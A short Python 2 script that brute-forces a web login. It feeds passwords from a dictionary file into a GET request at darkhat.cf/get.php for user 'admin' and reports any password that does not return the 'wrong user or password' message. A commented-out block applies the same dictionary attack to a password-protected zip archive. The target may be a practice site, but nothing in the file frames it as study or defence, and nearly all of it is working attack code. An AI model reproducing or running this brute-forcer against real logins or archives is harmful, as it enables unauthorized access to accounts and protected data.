import urllib2
dictionary = 'dictionary.txt'
#values={'user':'admin','pass':'password'}
url1='http://darkhat.cf/get.php?user=admin&pass='
#url2='password'
#url=url1+url2
#response=urllib2.urlopen(url)
#h=response.read()
#print h
with open(dictionary, 'r') as f:
	for line in f.readlines():
		password = line.strip('\n')
		try:
			url=url1+password
			response=urllib2.urlopen(url)
			h=response.read()
			page=h.split('"')
			#print page[1]
			if(page[1] != 'wrong user or password'):
				print 'your password is:'+password
		except:
			pass
		
#mario
#carbonell
			
#data = urllib.urlencode(values)
#req = urllib2.Request(url, data)
#response = urllib2.urlopen(req)
#page = response.read()
#print page	
#urllib2.request(url,urllib2.urlencode(values))
'''
zip_file = zipfile.ZipFile(zipfilename)
with open(dictionary, 'r') as f:
	for line in f.readlines():
		password = line.strip('\n')
		try:
			zip_file.extractall(pwd=password)
			password = 'Password found: %s' % password
		except:
			pass
print password
'''
